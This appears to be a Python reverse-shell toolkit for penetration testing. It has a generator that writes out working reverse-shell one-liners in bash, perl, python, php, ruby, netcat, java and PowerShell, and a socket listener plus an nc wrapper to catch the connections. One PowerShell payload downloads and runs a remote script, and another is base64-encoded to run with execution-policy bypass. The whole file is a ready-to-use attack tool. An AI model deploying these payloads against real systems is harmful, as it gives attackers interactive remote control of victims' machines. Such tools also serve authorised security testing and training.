#!/usr/bin/python

import socket
import sys
import pty
import util
import time
import threading
import readline
import base64

class ShellListener:

    def __init__(self, addr, port):
        self.listen_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bind_addr = addr
        self.port = port
        self.on_message = None
        self.listen_thread = None
        self.connection = None

    def startBackground(self):
        self.listen_thread = threading.Thread(target=self.start)
        self.listen_thread.start()
        return self.listen_thread

    def start(self):
        self.running = True
        self.listen_socket.bind((self.bind_addr, self.port))
        self.listen_socket.listen()
        while self.running:
            self.connection, addr = self.listen_socket.accept()
            with self.connection:
                print("[+] Got connection:", addr)
                while self.running:
                    data = self.connection.recv(1024)
                    if not data:
                        break
                    if self.on_message:
                        self.on_message(data)
                        
            print("[-] Disconnected")
            self.connection = None

    def close(self):
        self.running = False
        self.sendline("exit")
        self.listen_socket.close()

    def send(self, data):
        if self.connection:
            if isinstance(data, str):
                data = data.encode()
            self.connection.sendall(data)

    def sendline(self, data):
        if isinstance(data, str):
            data = data.encode()
        data += b"\n"
        return self.send(data)

    def print_message(self, data):
        sys.stdout.write(data.decode())
        sys.stdout.flush()

    def interactive(self):
        self.on_message = lambda x: self.print_message(x)
        while self.running and self.connection is not None:
            self.sendline(input())

def generatePayload(type, local_address, port, index=None):

    commands = []

    if type == "bash":
        commands.append(f"bash -i >& /dev/tcp/{local_address}/{port} 0>&1")
    elif type == "perl":
        commands.append(f"perl -e 'use Socket;$i=\"{local_address}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'")
        commands.append(f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{local_address}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'")
    elif type == "python" or type == "python2" or type == "python3":
        binary = type
        commands.append(f"{binary} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local_address}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'")
    elif type == "php":
        commands.append(f"php -r '$sock=fsockopen(\"{local_address}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'")
    elif type == "ruby":
        commands.append(f"ruby -rsocket -e'f=TCPSocket.open(\"{local_address}\",{port}).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'")
    elif type == "netcat" or type == "nc":
        commands.append(f"nc -e /bin/bash {local_address} {port}")
        commands.append(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {local_address} {port} >/tmp/f")
    elif type == "java":
        commands.append(f"r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{local_address}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()")
    elif type == "xterm":
        commands.append(f"xterm -display {local_address}:1")
    elif type == "powercat":
        return "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://%s/powercat.ps1');powercat -c %s -p %d -e cmd\"" % (local_address, local_address, port)
    elif type == "powershell":
        payload = '$a=New-Object System.Net.Sockets.TCPClient("%s",%d);$d=$a.GetStream();[byte[]]$k=0..65535|%%{0};while(($i=$d.Read($k,0,$k.Length)) -ne 0){;$o=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($k,0,$i);$q=(iex $o 2>&1|Out-String);$c=$q+"$ ";$b=([text.encoding]::ASCII).GetBytes($c);$d.Write($b,0,$b.Length);$d.Flush()};$a.Close();' % (local_address, port)
        payload_encoded = base64.b64encode(payload.encode("UTF-16LE")).decode()
        return f"powershell.exe -exec bypass -enc {payload_encoded}"
    else:
        return None

    if index is None or index < 0 or index >= len(commands):
        return "\n".join(commands)
    else:
        return commands[index]

def spawn_listener(port):
    pty.spawn(["nc", "-lvvp", str(port)])

def triggerShell(func, port):
    def _wait_and_exec():
        time.sleep(1.5)
        func()

    threading.Thread(target=_wait_and_exec).start()
    spawn_listener(port)

def triggerShellBackground(func, port):   
    listener = ShellListener("0.0.0.0", port)
    listener.startBackground()
    threading.Thread(target=func).start()
    while listener.connection is None:
        time.sleep(0.5)
    return listener

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Usage: %s <type> [port]" % sys.argv[0])
        exit(1)

    listen_port = None if len(sys.argv) < 3 else int(sys.argv[2])
    payload_type = sys.argv[1].lower()

    local_address = util.getAddress()

    # choose random port
    if listen_port is None:
        sock = util.openServer(local_address)
        if not sock:
            exit(1)
        listen_port = sock.getsockname()[1]
        sock.close()

    payload = generatePayload(payload_type, local_address, listen_port)

    if payload is None:
        print("Unknown payload type: %s" % payload_type)
        print("Supported types: bash, perl, python[2|3], php, ruby, netcat|nc, java, xterm, powershell")
        exit(1)

    tty = "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    print("---PAYLOAD---\n%s\n---TTY---\n%s\n---------\n" % (payload, tty))

    if payload_type == "xterm":
        print("You need to run the following commands (not tested):")
        print("xhost +targetip")
        print("Xnest :1")
    else:
        pty.spawn(["nc", "-lvvp", str(listen_port)])
